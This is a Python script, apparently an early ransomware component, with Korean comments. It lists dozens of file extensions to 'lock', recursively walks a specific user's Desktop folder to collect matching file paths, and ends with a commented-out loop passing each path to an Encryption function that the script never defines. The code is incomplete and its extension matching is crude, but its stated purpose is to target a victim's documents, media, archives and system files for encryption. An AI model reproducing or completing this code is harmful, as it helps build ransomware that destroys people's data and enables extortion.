import os

#arr는 잠그기 위한 확장자 list
arr = ['.doc', '.docx', '.hwp', '.pptx', '.ppt', '.xls', '.pdf', '.ai', '.psd', '.tx', '.bmp', '.gif', '.png', '.jpg', '.jpeg', '.raw', '.tiff', '.was', '.wma', '.mp3', '.mp4', '.mkv', '.avi', '.flv', '.mov', '.7z', '.aip', '.alz', '.egg', '.zip', '.py', '.c', '.cpp', '.java', '.class', '.html', '.ini', '.lnk', '.exe', '.ttf', '.sys', '.dat', 'jar', '.md']
forChange = [] #확장자들의 요소들만을 가지고 있음.
linkForChange = [] #확장자들이 존재하는 링크list
link = 'C:\\Users\\Ebaman\\Desktop' #박승민 컴퓨터 기준 배경화면 경로
file_list = os.listdir(link) # link 경로에 있는 모든 파일들을 file_list로 저장.

def isFile(llist, llink): 
    noChange = [] #폴더 파일
    global forChange 
    global linkForChange
    ffile_list = llist #
    global link
    
    #현재 전체 파일list에서 확장자가 존재하는지를 확인하기 위한 이중 for문
    for i in range(0, len(ffile_list)): 
        for j in range(0, len(arr)): 
            if ffile_list[i].find(arr[j]) >= 0: #파일 이름이 다음 확장자를 내포하고있다면,
                linkForChange.append(llink + '\\' + ffile_list[i]) #경로와 확장자를 합쳐서 저장.
                forChange.append(ffile_list[i]) #파일 추가.
                
    #전체 파일 list랑 폴더list랑 확장자 list를 집합화 하여 중복을 제거함.  
    ffile_list_set = set(ffile_list) 
    forChange_set = set(forChange)
    noChange_set = set(noChange)

    noChange_set = ffile_list_set - forChange_set #전체 파일에서 확장자set를 빼주면, 폴더set이 나옴.
    noChange = list(noChange_set)
    if not len(noChange): # 더이상 폴더파일 이 존재하지않을 경우에 종료.
        return
    else:
        for i in range(0, len(noChange)):
            tempLink = link #임의 변수에 link의 경로를 미리 복사해놓음
            link += '\\' + noChange[i] #이부분이 사실상 최종 경로.
            ffile_list = os.listdir(link) 
            isFile(ffile_list, link) 
            link = tempLink #위에 부분이 끝나고 남아있는정보를 reset하기 위함.
            
            

isFile(file_list, link)

#print(linkForChange) #경로들의 list
'''
for i in range(0, len(linkForChange)):
    Encryption(linkForChange[i])
    '''


